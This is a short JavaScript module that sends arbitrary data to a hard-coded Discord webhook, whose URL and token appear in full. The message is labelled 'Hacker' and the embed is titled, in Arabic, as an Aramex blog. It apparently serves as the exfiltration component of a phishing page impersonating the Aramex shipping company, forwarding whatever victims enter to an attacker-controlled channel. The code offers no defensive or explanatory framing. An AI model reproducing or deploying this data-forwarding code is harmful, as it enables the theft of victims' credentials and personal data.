import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: "  2 مدونة ارامكس ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1340348221213507584/0mMj83p5xKe5myLwwreOl7ERp3ZPUvE2bQub3bdsSOK57CrPBQIsU6KT-Fj3C_RDBGKe",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
